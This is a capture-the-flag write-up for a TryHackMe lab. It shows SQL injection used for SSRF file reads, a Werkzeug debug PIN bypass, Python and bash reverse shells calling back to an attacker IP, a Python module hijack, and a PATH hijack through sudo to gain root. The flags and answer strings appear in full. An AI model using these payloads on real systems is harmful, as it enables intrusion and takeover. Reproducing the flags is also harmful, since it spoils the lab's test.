# https://tryhackme.com/jr/surfingyetiiscomingtotown
+ What is the user flag?`THM{SQli_SsRF_2_WeRkZeuG_PiN_ExPloit}`
+ What is the root flag?
+ What is the yetikey4.txt flag?

## ENUMERATION PORT 8000
+ URL SQLInjection `http://10.10.35.168:8000/download?id=`
+ Using `sqlmap` database:
    ```
    [*] elfimages
    [*] information_schema
    [*] performance_schema
    ```
+ Dump `elfimages.elves`:
    ```
    +----+--------+------------------------------------------------+
    | id | url_id | url                                            |
    +----+--------+------------------------------------------------+
    | 1  | 1      | http://127.0.0.1:8000/static/imgs/mcblue1.svg  |
    | 2  | 2      | http://127.0.0.1:8000/static/imgs/mcblue2.svg  |
    | 3  | 3      | http://127.0.0.1:8000/static/imgs/mcblue3.svg  |
    | 4  | 4      | http://127.0.0.1:8000/static/imgs/suspects.png |
    +----+--------+------------------------------------------------+
    ```
+ current user: `mcskidy@localhost`
+ hostname: `proddb`

# EXPLOIT
+ Trying to by pass PIN for werkerzeug 3.0.0 console.
+ Looting The File using SQL Injection File Export (LFI / SSRF):
    - http://10.10.211.16:8000/download?id=' UNION ALL SELECT 'file:///proc/sys/kernel/random/boot_id
    - http://10.10.211.16:8000/download?id=' UNION ALL SELECT 'file:///sys/class/net/eth0/address 
    `02:e7:a8:eb:9a:87`
    - http://10.10.211.16:8000/download?id=' UNION ALL SELECT 'file:///etc/machine-id `aee6189caee449718070b58132f2e4ba`
    - http://10.10.211.16:8000/download?id=' UNION ALL SELECT 'file:///proc/self/cgroup

    ```bash


    $python -c "print(0x02e7a8eb9a87)"   
    python -c 'x = "".join("02:01:42:ff:bf:bb".split(":")); print(hex(x))'
    3193994713735
    $python gen_machine_id.py 
    b'aee6189caee449718070b58132f2e4ba'
    $python werkzeug-debug-console-bypass/werkzeug-pin-bypass.py 
    Pin: 664-214-737
    ```

### PRIVILEGES ESCALATION
+ Python Reverse Shell 
    ```python
    python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.37.160",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
    ```
    + inject application by adding python file os.py
        - add this line to reverse shell os.py
        ```python
        #!/usr/bin/python3
        import os
        os.system('/bin/bash -c "bash -i >& /dev/tcp/10.4.37.160/1234 0>&1"')
        ```

    + Look at log Git :
        ```bash
        mcskidy@proddb:~/app$ git diff e9855c8a10cb97c287759f498c3314912b7f4713
        diff --git a/app.py b/app.py
        index 5f5ff6e..875cbb8 100644
        --- a/app.py
        +++ b/app.py
        @@ -10,7 +10,7 @@ app = Flask(__name__, static_url_path='/static')
        # MySQL configuration
        app.config['MYSQL_HOST'] = 'localhost'
        app.config['MYSQL_USER'] = 'mcskidy'
        -app.config['MYSQL_PASSWORD'] = 'F453TgvhALjZ'
        +app.config['MYSQL_PASSWORD'] = 'fSXT8582GcMLmSt6'
        app.config['MYSQL_DB'] = 'elfimages'
        mysql = MySQL(app)
        
        @@ -18,5 +18,32 @@ mysql = MySQL(app)
        def index():
            return render_template("index.html")
        
        +@app.route("/download")
        +def download():
        +    file_id = request.args.get('id','')
        +
        +    if file_id!='':
        +        cur = mysql.connection.cursor()
        ```
    + Add file with `echo 'bash' > /home/mcskidy/[` and then `chmod +x /home/mcskidy/[`
    + After that run `sudo /usr/bin/bash /opt/check.sh`
    + Got root priviledge
    + Print all txt file on /root         
        ```bash
        root@proddb:/home/mcskidy# cat /root/*.txt
        THM{BaNDiT_YeTi_Lik3s_PATH_HijacKing}
        4-3f$FEBwD6AoqnyLjJ!!Hk4tc*V6w$UuK#evLWkBp
        ```
